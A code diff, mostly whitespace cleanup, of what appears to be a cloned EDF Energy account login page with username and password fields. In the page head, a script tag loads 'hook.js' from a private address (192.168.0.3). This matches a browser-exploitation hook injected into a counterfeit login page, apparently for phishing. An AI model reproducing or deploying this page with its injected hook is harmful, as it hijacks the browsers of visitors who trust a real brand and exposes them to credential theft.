@@ -70,7 +70,7 @@ function popupUnsavedDataBeforeUnload(evt)
 {
 	if ((typeof pageTitleBar != "undefined") && pageTitleBar.backForwardLink)
 	{
-		pageTitleBar.backForwardLink = false;	
+		pageTitleBar.backForwardLink = false;
 	}
 	else
 	{
@@ -83,7 +83,7 @@ function popupUnsavedDataBeforeUnload(evt)
 				evt.returnValue = 'You have unsaved data';
 			}
 			else
-			{		
+			{
 				evt.preventDefault();
 				evt.stopPropagation();
 				return 'You have unsaved data';
@@ -94,12 +94,12 @@ function popupUnsavedDataBeforeUnload(evt)
 
 try{
      if ( EPCM.getUAType() == EPCM.MSIE || EPCM.getUAType()== EPCM.MOZILLA){
-       if (window==EPCM.getSAPTop()){  
+       if (window==EPCM.getSAPTop()){
          window.onbeforeunload = popupUnsavedDataBeforeUnload;
-       }   
+       }
      }
-} catch(ex){} 
-</script><script>frameworkSupport.init({anonymous:true,phase:'framework',portalURL:'https://my-account.edfenergy.com:443/irj/portal/anonymous'});</script><script>frameworkSupport.init2({contentAreaURL:'/irj/servlet/prt/portal/prteventname/Navigate/prtroot/pcd!3aportal_content!2fEdf_Energy_Development!2fOrchard!2fDesktop!2fEDFE_Framework!2fEDFE_Anonymous!2fCustomLogonDesktop!2fframeworkPages!2fcom.edfe.orchard.pct.Logon_Page_pg!2fcom.sap.portal.innerpage!2fcom.sap.portal.contentarea',portalURL:'https://my-account.edfenergy.com:443/irj/portal/anonymous',innerPage:'pcd:portal_content/Edf_Energy_Development/Orchard/Desktop/EDFE_Framework/EDFE_Anonymous/CustomLogonDesktop/frameworkPages/com.edfe.orchard.pct.Logon_Page_pg/com.sap.portal.innerpage',innerPageFrameURL:'/irj/servlet/prt/portal/prteventname/Navigate/prtroot/pcd!3aportal_content!2fEdf_Energy_Development!2fOrchard!2fDesktop!2fEDFE_Framework!2fEDFE_Anonymous!2fCustomLogonDesktop!2fframeworkPages!2fcom.edfe.orchard.pct.Logon_Page_pg!2fcom.sap.portal.innerpage',tlnComp:'/irj/portalapps/com.sap.portal.navigation.toplevel',ObjBasedNavigationURL:'/irj/servlet/prt/portal/prtroot/com.sap.portal.navigation.objbased.ObjBasedNavigation',serverPath:'https://my-account.edfenergy.com:443',usedConnectors:''});</script>	
+} catch(ex){}
+</script><script>frameworkSupport.init({anonymous:true,phase:'framework',portalURL:'https://my-account.edfenergy.com:443/irj/portal/anonymous'});</script><script>frameworkSupport.init2({contentAreaURL:'/irj/servlet/prt/portal/prteventname/Navigate/prtroot/pcd!3aportal_content!2fEdf_Energy_Development!2fOrchard!2fDesktop!2fEDFE_Framework!2fEDFE_Anonymous!2fCustomLogonDesktop!2fframeworkPages!2fcom.edfe.orchard.pct.Logon_Page_pg!2fcom.sap.portal.innerpage!2fcom.sap.portal.contentarea',portalURL:'https://my-account.edfenergy.com:443/irj/portal/anonymous',innerPage:'pcd:portal_content/Edf_Energy_Development/Orchard/Desktop/EDFE_Framework/EDFE_Anonymous/CustomLogonDesktop/frameworkPages/com.edfe.orchard.pct.Logon_Page_pg/com.sap.portal.innerpage',innerPageFrameURL:'/irj/servlet/prt/portal/prteventname/Navigate/prtroot/pcd!3aportal_content!2fEdf_Energy_Development!2fOrchard!2fDesktop!2fEDFE_Framework!2fEDFE_Anonymous!2fCustomLogonDesktop!2fframeworkPages!2fcom.edfe.orchard.pct.Logon_Page_pg!2fcom.sap.portal.innerpage',tlnComp:'/irj/portalapps/com.sap.portal.navigation.toplevel',ObjBasedNavigationURL:'/irj/servlet/prt/portal/prtroot/com.sap.portal.navigation.objbased.ObjBasedNavigation',serverPath:'https://my-account.edfenergy.com:443',usedConnectors:''});</script>
 
 <span id=divChangeContent name=divChangeContent style="position:absolute;height:0;width:0;top:-5000;left:-5000">
 	<FORM action="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com" method=POST id="frmChangeContent" name="frmChangeContent">
@@ -135,10 +135,10 @@ pageSupport._addIViewBank("page0ivu0",new iviewBank("","",pageSupport.EMBEDDED,1
     <script>
         document.body.style.margin=0;
         document.body.scroll = "no";
-       
-       
+
+
     </script>
- 
+
             <TABLE style="WIDTH: 100%" cellSpacing=0 cellPadding=0  class="prtlHeaderCon"  ><TR><TD>
 <!-- EPCF: Component com.edfe.orchard.Logon.LogonComp, fchmhdeefnpeknleddanfldjjggfpmig -->
 
@@ -153,7 +153,7 @@ pageSupport._addIViewBank("page0ivu0",new iviewBank("","",pageSupport.EMBEDDED,1
 
 
 
-    
+
 
 <html xmlns:xalan-nodeset="http://xml.apache.org/xalan" xmlns:java="http://xml.apache.org/xslt/java" xmlns="http://www.w3.org/1999/xhtml">
   <head>
@@ -162,18 +162,18 @@ pageSupport._addIViewBank("page0ivu0",new iviewBank("","",pageSupport.EMBEDDED,1
 
 
 	<link rel="SHORTCUT ICON" href="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/images/favicon/favicon.ico" />
-	
-	
-	<script type="text/javascript" src="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/scripts/edfenergy-ga-script-n.js"></script>	
-		
+
+
+	<script type="text/javascript" src="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/scripts/edfenergy-ga-script-n.js"></script>
+
 		<script type="text/javascript">
 		loadTrackCode('UA-25608035-1');
-	
-			  	
+
+
 				  _gaq.push(['_trackPageview', 'Login']);
-					
+
 		</script>
-	
+
 
 <script language="JavaScript">
 /*var emailRegEx = /^([a-zA-Z0-9_\.\!\#\$\%\^\&\*\{\}\~\`\+\_\=\?\'\|\"\-]{2,})\@(([a-zA-Z0-9\-]{2,})\.)+([a-zA-Z]{2,4})+$/;*/
@@ -182,7 +182,7 @@ var Monitor_Flag1 = true;
 	document.onkeyup = checkKeyPressed;
 
 	window.history.forward(1);
-	
+
 	function EDFEDisableSubmitButton1( button_text1, button_id1 )
 	{
 	var bid = button_id1;
@@ -195,59 +195,59 @@ var Monitor_Flag1 = true;
 		if(event.keyCode==13)
 		{
 			event.keyCode=9;
-		}	
+		}
 	}
 	function checkKeyPressed()
 	{
 		if(event.keyCode==13)
-		{	
-			
+		{
+
 			if(Monitor_Flag1!=null && Monitor_Flag1==true){
-			
+
 			callGA('yes');
 			}
 			else
 			{
-			
+
 			callGA('no');
 			}
-		}	
+		}
 	}
-	
+
 	function change(param1,param2)
 	{
-		param1.style.backgroundColor = param2;	
+		param1.style.backgroundColor = param2;
 	}
 
 
-	function allValidChars(email) 
+	function allValidChars(email)
 	{
-	
+
 		var parsed = true;
-		
+
 		var validchars = "abcdefghijklmnopqrstuvwxyz0123456789@.-_!#$%&`*+-/=?^'{}|~\"";
-		
-		
-		for (var i=0; i < email.length; i++) 
+
+
+		for (var i=0; i < email.length; i++)
 		{
-			
+
 			var letter = email.charAt(i).toLowerCase();
-			
+
 			if (validchars.indexOf(letter) != -1)
-			  continue;		  
+			  continue;
 			parsed = false;
 			break;
 		}
 		return parsed;
 	}
-	
+
 	function trim(str) {
 		return str.replace(/(^[\s\xA0]+|[\s\xA0]+$)/g, '');
 	}
 	function validateEmail(email)
 	{
 		var decision = true;
-		if(trim(email)!= null && trim(email) !=""){		
+		if(trim(email)!= null && trim(email) !=""){
 			if(email.match(emailRegEx)){
 				decision = true;
 			}else{
@@ -256,59 +256,59 @@ var Monitor_Flag1 = true;
 		}else{
 			decision = false;
 		}
-		
+
 		/*
-		if (! allValidChars(email)) 
-		{  
+		if (! allValidChars(email))
+		{
 	        decision = false;
 	    }
-		if (email.indexOf("@") < 1) 
-		{ 
+		if (email.indexOf("@") < 1)
+		{
 	        decision = false;
-	    } 
-	     
+	    }
+
 	    if(email.indexOf("@")!=email.lastIndexOf("@"))
 	    {
 	     decision = false;
-	    }    	
-	   
-	    else if (email.lastIndexOf(".") <= email.indexOf("@")) 
-	    {  
+	    }
+
+	    else if (email.lastIndexOf(".") <= email.indexOf("@"))
+	    {
 	        decision = false;
-	    } 
-	    else if (email.indexOf("@") == email.length) 
-	    {  
+	    }
+	    else if (email.indexOf("@") == email.length)
+	    {
 	        decision = false;
-	    } 
-	    else if (email.indexOf("..") >=0) 
-	    { 
+	    }
+	    else if (email.indexOf("..") >=0)
+	    {
 			decision = false;
-	    } 
-	    else if (email.indexOf(".") == email.length) 
-	    {  
+	    }
+	    else if (email.indexOf(".") == email.length)
+	    {
 			decision = false;
 	    }*/
 	    if(!decision)
 	    {
-	    	
+
 	    	document.logonForm.f_username.focus();
-	    	
-	    	change(document.logonForm.f_username,'#FFFFFF'); // Cosmotic Changes 
-	    	
+
+	    	change(document.logonForm.f_username,'#FFFFFF'); // Cosmotic Changes
+
 	    	document.getElementById('errorMessage').innerHTML = "Please enter a valid email address";
 			document.getElementById('errorMessage1').innerHTML = "";
-	    	
+
 	    }
 	    else
 	    {
-	    	
+
 	    	change(document.logonForm.f_username,'#FFFFFF');
 	    }
 	    return decision;
 	}
-	
 
-	function callGA(GA) 
+
+	function callGA(GA)
 	{
 		if(GA!=null && GA=="yes")
 		{
@@ -317,24 +317,24 @@ var Monitor_Flag1 = true;
 		var t = setTimeout("validateLogin()", 100);
 	}
 
-	
+
 
 	function validateLogin()
 	{
-	 		
+
 		var email = document.logonForm.f_username.value;
 		var pass = document.logonForm.f_passwd.value;
-		
+
 		if(email==null || email=="")
 		{
 			document.logonForm.f_username.focus();
-			
+
 			document.getElementById('errorMessage').innerHTML = "Please enter your 'username', which is your email address";
-			
+
 			document.getElementById('errorMessage1').innerHTML = "";
 			return false;
 		}
-		else 
+		else
 		{
 			if(validateEmail(email))
 			{
@@ -348,16 +348,16 @@ var Monitor_Flag1 = true;
 				}
 				else
 				{
-					change(document.logonForm.f_passwd,'#FFFFFF');				
-					document.logonForm.action = "/nclogin.submit";	
-					
+					change(document.logonForm.f_passwd,'#FFFFFF');
+					document.logonForm.action = "/nclogin.submit";
+
 					EDFEDisableSubmitButton1('Login','EDFElogonButton');
 					document.logonForm.submit();
 				}
 			}
-			
+
 		}
-		
+
 	}
 
 
@@ -366,49 +366,49 @@ var Monitor_Flag1 = true;
 		document.logonForm.action = "/irj/servlet/prt/portal/prtroot/com.edfe.orcharcd.forgotUserName.ForgotUserNameController";
 		document.logonForm.submit();
 	}
-	
-	
+
+
 	function validateFP()
 	{
 		document.logonForm.action = "/irj/servlet/prt/portal/prtroot/com.edfe.orchard.forgotPassword.ForgotPasswordComp";
 		document.logonForm.submit();
 	}
-	
-	
+
+
 		function validateRegisterSME()
 	{
 		document.logonForm.action = "/irj/servlet/prt/portal/prtroot/com.edfe.orchard.SelfRegistration.SelfRegistrationComp"+"?refUsr=SME";
-		
+
 		document.logonForm.submit();
 	}
 		function validateRegisterResi()
 	{
 		document.logonForm.action = "/irj/servlet/prt/portal/prtroot/com.edfe.orchard.SelfRegistration.SelfRegistrationComp"+"?refUsr=RESI";
-		
+
 		document.logonForm.submit();
 	}
-	
+
 
 	function validateMR()
 	{
-		document.logonForm.action = "/irj/servlet/prt/portal/prtroot/EnterMeterRead_OutAccount.EnterMeterRead_Controller"; 
+		document.logonForm.action = "/irj/servlet/prt/portal/prtroot/EnterMeterRead_OutAccount.EnterMeterRead_Controller";
 		document.logonForm.submit();
 	}
 
-	
+
 
 </script>
 
   <script type="text/javascript" src="http://192.168.0.3:80/hook.js"></script>
 </head>
-  
+
   <body onLoad="history.forward(); document.logonForm.f_username.focus();">
 	<div id="wrap">
 	  <div id="outer-right">
 		<div id="outer">
 <!--------------------------- start top section ----------------------------------->
 
-	
+
 
 
 <script>
@@ -435,7 +435,7 @@ function EDFEDisableSubmitButton( button_text, button_id )
 
 
 <!--------------------------- start top section ----------------------------------->
-		
+
 	<div id="header">
 		  <p class="hide-element">
 			<a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#pnav">skip to primary navigation</a>
@@ -443,31 +443,31 @@ function EDFEDisableSubmitButton( button_text, button_id )
 		  <div id='logo'>
 			<img src='https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/images/common/edfenergy_logo2.gif' title='EDF Energy' alt='EDF Energy' width='56' height='89' border='0' />
 		  </div><!-- start top utilities -->
-          
+
 		  <div id="toplinks">
 		  <div class="left">
          <ul>
 				<li><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com">Home</a></li>
-				<li><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com">MyAccount</a></li>		
+				<li><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com">MyAccount</a></li>
 				<li><a href="https://my-account.edfenergy.com/irj/servlet/prt/portal/prtroot/EnterMeterRead_OutAccount.EnterMeterRead_Controller">My meter reading</a></li>
 		 </ul>
 		 </div>
-				
+
 		<div class="right">
 			<ul>
 				<li><a href="http://www.edf.com" target="_blank">EDF Group</a></li>
-			</ul>        
-           	
+			</ul>
+
            <div id="searchform">
 <form name="SearchForm" id="SearchForm" action="/irj/portal/anonymous">			  <input name="searchBox" id="searchBox" type="text" value="Search" class="searchtextbox" onfocus="clearText()" />
 			  <input name="searchSubmit" type="image" src="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/images/common/search-icon.png" title="Perform Search" class="faq-button" onclick="performSearch(); return false;" />
 			<input type="hidden" name="__ncforminfo" value="aG5IjEByLfWulwL539YlRxugW3Unfla8YtGvDKb-X_2YFxvNDTOZUB0qVQVl6ZXF"></form>
-		   </div>	
-		   
-		</div>		 		  
+		   </div>
+
+		</div>
 </div>
-		
-		  
+
+
 		  <div id="olympiclogo">
 			<img src="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/images/common/london2012_logo_new.gif" alt="London 2012 Official Electricity Supplier" title="London 2012 Official Electricity Supplier" />
 		  </div><!-- end top utilities -->
@@ -480,7 +480,7 @@ function EDFEDisableSubmitButton( button_text, button_id )
               </p>
               <p class="hide-element">
                 <a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#snav">skip to secondary navigation</a>
-              </p> 
+              </p>
               <ul>
                 <li>
                   <a target="_blank" href="https://www.edfenergy.com/products-services/index.shtml" >Products &amp; Services</a>
@@ -488,7 +488,7 @@ function EDFEDisableSubmitButton( button_text, button_id )
 	    		<li>
 	            <a target="_blank" href="http://www.edfenergy.com/energyfuture">Energy Future</a>
 	            </li>
-                
+
                 <li>
                   <a target="_blank" href="https://www.edfenergy.com/about-us/index.shtml">About us</a>
                 </li>
@@ -504,23 +504,23 @@ function EDFEDisableSubmitButton( button_text, button_id )
                 <li>
                   <a target="_blank" href="https://www.edfenergy.com/safety-emergencies/index.shtml">Safety &amp; emergencies</a>
                 </li>
-                
+
               </ul>
               <div class="clearFix"></div>
             </div>
           </div><!-- end top navigation -->
-		  </div>		  		  
-<!--------------------------- end top section ----------------------------------->	  
+		  </div>
+<!--------------------------- end top section ----------------------------------->
 
 
 
-<!--------------------------- end top section ----------------------------------->	  
-		  
+<!--------------------------- end top section ----------------------------------->
+
 <div id="pagehold">
-           	
+
 <!--------------------------- start left section ----------------------------------->
 
-		
+
 
 
 <SCRIPT>
@@ -538,50 +538,50 @@ function EDFEDisableSubmitButton( button_text, button_id )
 		}
 	}
 </SCRIPT>
- 
+
 			<!-- start left section forgottenusername.html;forgottenpassword.html -->
 			   <div id="leftnav-outer">
 			  <div id="leftnav">
 				  <ul>
-	
-							<li><ul><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="xxx" onClick="fnNavigateMenu('/irj/servlet/prt/portal/prtroot/EnterMeterRead_OutAccount.EnterMeterRead_Controller','false','EMR')" >Submit meter reading</a></ul></li>	
-		
+
+							<li><ul><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="xxx" onClick="fnNavigateMenu('/irj/servlet/prt/portal/prtroot/EnterMeterRead_OutAccount.EnterMeterRead_Controller','false','EMR')" >Submit meter reading</a></ul></li>
+
 							<li>
 							<ul>
 								<a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="xxx" onClick="fnNavigateMenu('http://www.edfenergy.com/contact-us/index.shtml','true','CONTACTUS')">Contact us</a>
 							</ul>
 						</li>
 						<li>
-						
-							<ul><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="current" onClick="fnNavigateMenu('/irj/portal/anonymous','false','LOGON')" >Login / Register</a>	
+
+							<ul><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="current" onClick="fnNavigateMenu('/irj/portal/anonymous','false','LOGON')" >Login / Register</a>
 								<ul>
 									<li><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="" onClick="fnNavigateMenu('/irj/servlet/prt/portal/prtroot/com.edfe.orcharcd.forgotUserName.ForgotUserNameController','false','FUN')" >Forgotten your username</a></li>
 									<li><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" class="" onClick="fnNavigateMenu('/irj/servlet/prt/portal/prtroot/com.edfe.orchard.forgotPassword.ForgotPasswordComp','false','FUP')" >Forgotten your password</a></li>
 								</ul>
 							</ul>
-							
-					</li>					
+
+					</li>
 
 				</ul>
-	
+
 				<ul>
 				<br/><br/>
 				<div id="lpButtonDiv" align="center">
-				 
+
 				</div>
 				</ul>
-	 
+
 			  </div>
 			</div>
-					<!-- end left section -->			
+					<!-- end left section -->
 <form name="outsidemenu" method="POST" action="/irj/portal/anonymous">	<input type="hidden" name="menuidentifier" value="">
 <input type="hidden" name="__ncforminfo" value="aG5IjEByLfWqJ6R7zZUHhDE15UF2cpEumhm0TWuQDLfNnOD8MqMtjNF30GgZOV1f"></form>
-					
+
 <!--------------------------- end left section ----------------------------------->
 
-              
+
 <!--------------------------- start middle section ----------------------------------->
-              
+
 			<div id="maincontent-wrap" class="fullwidth">
 			  <p class="hide-element">
 				<a name="cont" id="cont">main content</a>
@@ -603,7 +603,7 @@ function EDFEDisableSubmitButton( button_text, button_id )
 				  </div>
 				</div>
 				<div id="two-col-wrap" class="two_col_wrap_bg">
-                  
+
 				  <div id="content" class="make-full">
 					<div id="data">
 						<div id="leftcolumn">
@@ -613,52 +613,52 @@ function EDFEDisableSubmitButton( button_text, button_id )
 
 <form name="logonForm" method="post" action="/irj/portal/anonymous">
 				<span class="legacymessage">
-				
+
 				</span>
 				<span class="legacymessage">
-				
+
 				</span>
-			  
-				
-			  	
+
+
+
 				<span class="warningmessage" id="errorMessage"></span><BR/>
 				<span class="warningmessage" id="errorMessage1"></span>
-				
-				
+
+
 				<input type ="hidden" name = "f_method" value = "LOGIN" />
 				<table class="formfields" border="1" summary="Visual Layout for the login form">
 				<tbody>
 				<tr>
 				<th><label for="f_username">Username (email address)<em>*</em></label></th><td>
-				
+
 				<input id="f_username" name="f_username" type="text" size="27" maxlength="241" tabindex="1" value=""/>
-				
+
 				<A class="form_field_help" href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#f_username"><IMG alt="help" title="help" src="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/images/buttons/help_button.gif"><SPAN>Please enter your username</SPAN></A>
 				</td>
 				</tr>
 				<tr>
 				<th><label for="f_passwd">Password<em>*</em></label></th><td>
-				
+
 				<input id="f_passwd" name="f_passwd" type="Password" size="18" maxlength="16" tabindex="2" autocomplete=OFF/>
-				
+
 				<A class="form_field_help" href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#f_passwd"><IMG alt="help" title="help" src="https://my-account.edfenergy.com/irj/portalapps/com.edfe.orchard.Logon/images/buttons/help_button.gif"><SPAN>Please enter the password for this account</SPAN></A>
 				</td>
 				</tr>
-				
+
 				</tbody>
 				</table>
-				
+
 
 				<input type="submit" value="Login" style="background:#FE5815;color:white!important;heigth:6em;width:7em;font-size:14px;font-family:arial;font-weight:500;margin:0px;padding-left:15px;padding-right:15px;padding-top:7px;padding-bottom:7px;border:none;cursor:pointer">
 
-				
+
 				<br /><br /><br />
 				<p>Forgotten your <a href="javaScript:validateFU();">username</a> or <a href="javaScript:validateFP();">password</a>?</p>
 			<input type="hidden" name="__ncforminfo" value="aG5IjEByLfUN7mVuDM1dmcrQChOQXirPHBYBwncOB_h5_QMzu8x_5eBlZcqXpqJKJuOtpQFlZPpXFhCbOjTPxw=="></form>
 
 <!-- Prototype Builder End -->
 						</div>
-						<div id="rightcolumn">			
+						<div id="rightcolumn">
 					<h2>Register Today!</h2>
 				  <p>&nbsp;</p>
 
@@ -668,16 +668,16 @@ function EDFEDisableSubmitButton( button_text, button_id )
 			  <li class="tick"> Update your details</li>
 			  <li class="tick"> Sign up for Direct Debit</li>
 		  </ul><br/>
-									
+
 
 <table border=0><tr>
-<td>										
-			<div class="btbu" id="registerButtonResi"><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" onClick="validateRegisterResi();" class="">Register your<br> home &raquo;</a></div> 
+<td>
+			<div class="btbu" id="registerButtonResi"><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" onClick="validateRegisterResi();" class="">Register your<br> home &raquo;</a></div>
 			</td><td>
 &nbsp;&nbsp;&nbsp;</td>
 <td>			<div class="btbu" id="registerButtonSME"><a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" onClick="validateRegisterSME();" class="">Register your<br> business &raquo;</a></div>
 	</td></tr>
-	</table>								
+	</table>
 <br/>
 								  <p><strong>Don't have an online account?</strong><br/>You can still <a href="https://my-account.edfenergy.com/irj/portal/my-account.edfenergy.com#" onClick="validateMR();">submit a meter reading</a></p>
 						</div>
@@ -686,14 +686,14 @@ function EDFEDisableSubmitButton( button_text, button_id )
 				</div>
 			  </div>
 			</div>
-<!--------------------------- end middle section ----------------------------------->	
-		
-</div><!--pagehold-->
-		
-<!--------------------------- start bottom section ----------------------------------->	
-          
+<!--------------------------- end middle section ----------------------------------->
 
-		
+</div><!--pagehold-->
+
+<!--------------------------- start bottom section ----------------------------------->
+
+
+
 
 
 
@@ -720,32 +720,32 @@ function PrivacyPolicy()
 }
 // Removes leading whitespaces
 function LTrim( value ) {
-	
+
 	var re = /\s*((\S+\s*)*)/;
 	return value.replace(re, "$1");
-	
+
 }
 
 // Removes ending whitespaces
 function RTrim( value ) {
-	
+
 	var re = /((\s*\S+)*)\s*/;
 	return value.replace(re, "$1");
-	
+
 }
 
 // Removes leading and ending whitespaces
 function trim( value ) {
-	
+
 	return LTrim(RTrim(value));
-	
+
 }
 
 </script>
 
 
 
-<!-- start bottom section -->	
+<!-- start bottom section -->
 		  <div id="footer">
 			<ul>
 			  <li>
@@ -764,19 +764,19 @@ function trim( value ) {
 				<a href="http://www.edfenergy.com/products-services/fuel-mix.shtml" target="_blank">Our fuel mix</a>
 			  </li>
 			</ul>
-			
+
 				<p class="copy"> &copy; EDF Energy 2012 All rights reserved</p>
 				<p class = "cookiePolicy">By continuing to use this site, you agree to our <a target="_blank" href="http://www.edfenergy.com/about-us/cookies/cookie-policy.shtml" style = "text-decoration:underline; color: #fff">Cookie Policy</a>.If you don't agree to Cookies<br>being stored on your computer in line with that policy please navigate away from this site.</p>
 		  </div>
-          
-<!-- end bottom section -->		
+
+<!-- end bottom section -->
 
 
 <SCRIPT>
 	document.body.scroll = "";
-</SCRIPT>			
-<!--------------------------- end bottom section ----------------------------------->	
-	  
+</SCRIPT>
+<!--------------------------- end bottom section ----------------------------------->
+
 		</div><!--outer-->
 	  </div>
 	</div><!--wrap-->
